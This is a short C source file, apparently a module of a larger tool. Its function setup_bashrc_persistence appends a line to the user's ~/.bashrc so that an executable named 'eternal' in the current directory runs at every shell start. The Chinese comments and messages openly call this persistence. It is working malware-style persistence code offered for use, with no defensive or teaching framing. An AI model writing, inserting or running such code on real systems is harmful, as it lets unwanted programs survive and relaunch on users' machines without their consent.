#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"

#ifdef BASHRC_MOD
void setup_bashrc_persistence() {
    printf("设置bashrc持久化...\n");
    const char* bashrc_path = getenv("HOME");
    if (bashrc_path) {
        char full_path[512];
        snprintf(full_path, sizeof(full_path), "%s/.bashrc", bashrc_path);
        FILE *bashrc = fopen(full_path, "a");
        if (bashrc) {
            printf("在 %s 中添加持久化命令。\n", full_path);
            fprintf(bashrc, "\n# 持久化命令\n");
            fprintf(bashrc, "%s/eternal\n", getcwd(NULL, 0)); // 添加当前目录下的 eternal 可执行文件路径
            fclose(bashrc);
        } else {
            perror("无法打开 .bashrc 文件");
        }
    } else {
        printf("无法获取HOME环境变量。\n");
    }
}
#endif
